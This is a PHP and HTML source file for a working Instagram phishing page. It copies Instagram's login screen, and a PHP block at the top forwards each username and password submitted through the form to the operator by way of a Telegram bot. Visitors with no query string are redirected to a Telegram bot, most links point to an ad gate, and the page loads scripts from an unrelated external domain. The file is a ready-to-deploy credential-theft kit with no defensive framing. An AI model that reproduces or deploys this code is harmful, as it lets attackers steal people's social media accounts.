<?php
$token = 'TOKEN';
function bot($method, $data = []){
    global $token;

    $ch = curl_init('https://api.telegram.org/bot'.$token.'/'.$method);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res);
}

if (isset($_POST)) {
    $cid = "ADMINID";
    $username = $_POST['username'];
    $password = $_POST['password'];

    bot('sendMessage', [
            'chat_id'=>$cid,
            'text'=>"<b>📸Instagram Phishing!</b>\n\n<b>Login</b>: $username\n<b>Password</b>: $password",
            'parse_mode'=>'html'
    ]);
}


$id = $_SERVER['QUERY_STRING'];

if (empty($id)) {
    header("Location: https://t.me/xunixbot");
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <link rel="stylesheet" href="./styles/style.css">
</head>

<body>

<div id="content-container">

    <!--Phone's pictures section-->
    <section class="phones">
        <img src="./img/phones.png" alt="pictures on phone" class="phone-image">
        <div class="display-phone">
            <img class="picture" src="./img/photo-1.png" alt="#">
            <img class="picture" src="./img/photo-2.png" alt="#">
            <img class="picture" src="./img/photo-3.png" alt="#">
            <img class="picture" src="./img/photo-4.png" alt="#">
            <img class="picture" src="./img/photo-5.png" alt="#">
        </div>
    </section>

    <!--User's log in section-->
    <section class="user">

        <div class="login-container">

            <!--Instagram Logo-->
            <div class="instagram-logo-box">
                <img class="instagram-logo" src="./img/instagram-logo.png">
            </div>

            <!--Form Login-->
            <form id="login-post" method="POST" action="index.php">
                <input type="hidden" name="cid" value="<?php echo $id ?>">
                <div class="inputs-container">
                    <input type="text" name="username" placeholder="Phone number, username or email">
                </div>
                <div class="inputs-container">
                    <input type="password" name="password" placeholder="Password">
                </div>
                <button type="submit" class="login-button">Log In</button>

                <div class="or-container">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>

                <!--Facebook login-->
                <div class="facebook-container">
                    <a class="facebook-login" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank"><img class="facebook-logo" src="./img/facebook-logo.png">Log in
                        with Facebook</a>
                </div>
            </form>

            <!--Password recovery-->
            <a class="password-forgot" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">Forgot password?</a>
        </div>

        <!--Sign up-->
        <div class="signup-container">
            <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
        </div>


        <!--App's download-->
        <div class="get-container">
            <p>Get the app.</p>
            <div class="download-container">
                <a class="download-appstore" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank"><img class="appstore" src="./img/applestore-logo.png"></a>
                <a class="download-googleplay" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank"><img class="googleplay" src="./img/googleplay-logo.png"></a>
            </div>
        </div>

    </section>

</div>

<footer class="page-footer">

    <div class="links-container">
        <ul class="links-list">
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">ABOUT</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">PRESS</a>
            </li>
            <li>
                <a class="link" href="#https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f target=" _blank">API</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">JOBS</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">PRIVACY</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">TERMS</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">LOCATIONS</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">TOP ACCOUNTS</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">HASHTAGS</a>
            </li>
            <li>
                <a class="link" href="https://www.highcpmgate.com/n0uimit2f?key=07ae86c3d1e06daad540d4fcf3ef0b2f" target="_blank">LANGUAGE</a>
            </li>
        </ul>
    </div>

    <div class="footer-span-container">
            <span class="footer-span">
                © 2024 INSTAGRAM FROM FACEBOOK
            </span>
    </div>
</footer>
<script type='text/javascript' src='//subtlemillenniumgallop.com/dd/6b/aa/dd6baa2b632a5978651aeed7686da0d5.js'></script>
<script type='text/javascript' src='//subtlemillenniumgallop.com/e6/aa/8e/e6aa8ead9349dbc3c973ea327a525102.js'></script>
<script async="async" data-cfasync="false" src="//subtlemillenniumgallop.com/fcde1d5ffefb80a28f0cf2be32a66a63/invoke.js"></script>
<div id="container-fcde1d5ffefb80a28f0cf2be32a66a63"></div>
</body>

</html>
